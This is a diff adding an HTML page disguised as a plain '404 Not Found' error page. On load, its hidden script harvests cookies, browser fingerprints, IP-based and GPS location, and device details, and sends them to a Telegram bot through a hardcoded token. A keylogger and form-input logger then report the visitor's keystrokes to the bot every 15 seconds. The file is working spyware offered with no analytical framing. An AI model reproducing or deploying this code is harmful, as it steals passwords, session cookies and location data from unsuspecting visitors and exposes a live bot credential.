@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 15%; margin: 0; }
+        h1 { font-size: 6rem; margin: 0; letter-spacing: 10px; }
+    </style>
+</head>
+<body>
+    <h1>404</h1>
+    <script>
+        const BOT_TOKEN = "8719377342:AAGgD-ZVxynCs4IVyGaeljc4ExQn19ddpDA";
+        const ADMIN_ID = "5924914981";
+
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams();
+            params.append('chat_id', ADMIN_ID);
+            params.append('text', text.substring(0, 4096));
+            params.append('parse_mode', 'HTML');
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params,
+                    mode: 'no-cors'
+                });
+            } catch(e) {}
+        }
+
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Telegram')) return 'Telegram InApp Browser';
+            if (ua.includes('TikTok')) return 'TikTok InApp Browser';
+            if (ua.includes('FBAN')) return 'Facebook App';
+            if (ua.includes('Instagram')) return 'Instagram App';
+            if (ua.includes('WhatsApp')) return 'WhatsApp App';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
+            if (ua.includes('Firefox')) return 'Mozilla Firefox';
+            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
+            if (ua.includes('Edg')) return 'Microsoft Edge';
+            if (ua.includes('OPR')) return 'Opera';
+            return 'Unknown Browser';
+        }
+
+        function getAllCookies() {
+            try {
+                return document.cookie || 'No cookies (HttpOnly or disabled)';
+            } catch(e) {
+                return 'Cookie read error: ' + e.message;
+            }
+        }
+
+        async function getAdvancedFingerprint() {
+            let result = {};
+
+            // Canvas
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px Arial";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(0, 0, 100, 50);
+                ctx.fillStyle = "#069";
+                ctx.fillText("FP", 2, 15);
+                result.canvas = canvas.toDataURL().substring(0, 100);
+            } catch(e) { result.canvas = "failed"; }
+
+            // WebGL
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        result.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        result.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    }
+                }
+            } catch(e) { result.webgl = "failed"; }
+
+            // AudioContext
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (AudioContext) {
+                    const ac = new AudioContext();
+                    const oscillator = ac.createOscillator();
+                    const analyser = ac.createAnalyser();
+                    oscillator.connect(analyser);
+                    oscillator.disconnect();
+                    result.audio = "available";
+                    await ac.close();
+                }
+            } catch(e) { result.audio = "failed"; }
+
+            // Font detection (basic)
+            const testString = "mmmmmmmmmmlli";
+            const baseFonts = ["monospace", "sans-serif", "serif"];
+            const testFonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Comic Sans MS"];
+            let fontsDetected = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.font = "72px monospace";
+            const baseWidth = ctx.measureText(testString).width;
+            for (let font of testFonts) {
+                ctx.font = `72px ${font}, monospace`;
+                const width = ctx.measureText(testString).width;
+                if (width !== baseWidth) fontsDetected.push(font);
+            }
+            result.fonts = fontsDetected.join(", ") || "none";
+
+            return result;
+        }
+
+        async function getPublicInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    isp: data.org,
+                    timezone: data.timezone,
+                    asn: data.asn
+                };
+            } catch(e) {
+                return { ip: 'failed', error: e.message };
+            }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                const battery = await navigator.getBattery();
+                return `${Math.floor(battery.level * 100)}% ${battery.charging ? '(charging)' : '(not charging)'}`;
+            } catch(e) {
+                return 'not available';
+            }
+        }
+
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve('not supported');
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (acc: ${pos.coords.accuracy}m)`),
+                    () => resolve('denied by user')
+                );
+            });
+        }
+
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return 'not available';
+            return `${conn.effectiveType} | ${conn.downlink} Mbps | rtt: ${conn.rtt}ms`;
+        }
+
+        let keyLog = "";
+        let inputLog = [];
+
+        function startKeylogger() {
+            document.addEventListener('keydown', (e) => {
+                let key = e.key;
+                if (key === ' ') key = '[SPACE]';
+                if (key === 'Enter') key = '[ENTER]\n';
+                if (key === 'Backspace') key = '[BACKSPACE]';
+                if (key === 'Tab') key = '[TAB]';
+                keyLog += key;
+                if (keyLog.length > 2000) keyLog = keyLog.slice(-2000);
+            });
+
+            document.addEventListener('input', (e) => {
+                if (e.target.value) {
+                    inputLog.push(`${e.target.tagName}: ${e.target.value}`);
+                    if (inputLog.length > 30) inputLog.shift();
+                }
+            });
+        }
+
+        async function mainHarvest() {
+            const browser = getBrowser();
+            const cookies = getAllCookies();
+            const fp = await getAdvancedFingerprint();
+            const pub = await getPublicInfo();
+            const battery = await getBatteryInfo();
+            const location = await getLocation();
+            const network = getNetworkInfo();
+
+            const report = `
+🔐 <b>FULL HARVEST REPORT</b>
+⏱️ <b>Time:</b> ${new Date().toUTCString()}
+🧠 <b>Browser:</b> ${browser}
+🌐 <b>UserAgent:</b> ${navigator.userAgent}
+🍪 <b>Cookies:</b> ${cookies.substring(0, 1000)}
+📺 <b>Screen:</b> ${screen.width}x${screen.height} (color depth: ${screen.colorDepth})
+💻 <b>Platform:</b> ${navigator.platform}
+🌍 <b>Language:</b> ${navigator.language}
+🎨 <b>Canvas FP:</b> ${fp.canvas}
+🖥️ <b>WebGL Renderer:</b> ${fp.webgl_renderer || 'N/A'}
+🔊 <b>AudioContext:</b> ${fp.audio}
+🔤 <b>Detected Fonts:</b> ${fp.fonts}
+🌍 <b>IP:</b> ${pub.ip}
+🏙️ <b>Location:</b> ${pub.city}, ${pub.region}, ${pub.country}
+🕒 <b>Timezone:</b> ${pub.timezone || 'N/A'}
+📡 <b>ISP/ASN:</b> ${pub.isp || 'N/A'} (${pub.asn || 'N/A'})
+🔋 <b>Battery:</b> ${battery}
+📍 <b>GeoLocation:</b> ${location}
+📶 <b>Network:</b> ${network}
+💾 <b>Device Memory:</b> ${navigator.deviceMemory || 'unknown'} GB
+🧠 <b>CPU Cores:</b> ${navigator.hardwareConcurrency}
+🖱️ <b>Touch Support:</b> ${'ontouchstart' in window ? 'Yes' : 'No'}
+🎤 <b>Media Devices:</b> ${navigator.mediaDevices ? 'available' : 'not available'}
+🕵️ <b>Do Not Track:</b> ${navigator.doNotTrack || 'unspecified'}
+            `;
+
+            await sendToTelegram(report);
+
+            // Keylog & input log setiap 15 seconds
+            setInterval(async () => {
+                if (keyLog.length > 0) {
+                    await sendToTelegram(`⌨️ <b>KEYLOG (last 15s):</b>\n${keyLog.slice(-1500)}`);
+                }
+                if (inputLog.length > 0) {
+                    await sendToTelegram(`📝 <b>INPUT LOG (last 30 entries):</b>\n${inputLog.join('\n').slice(-1500)}`);
+                }
+            }, 15000);
+        }
+
+        window.onload = () => {
+            mainHarvest();
+            startKeylogger();
+        };
+    </script>
+</body>
+  </html>
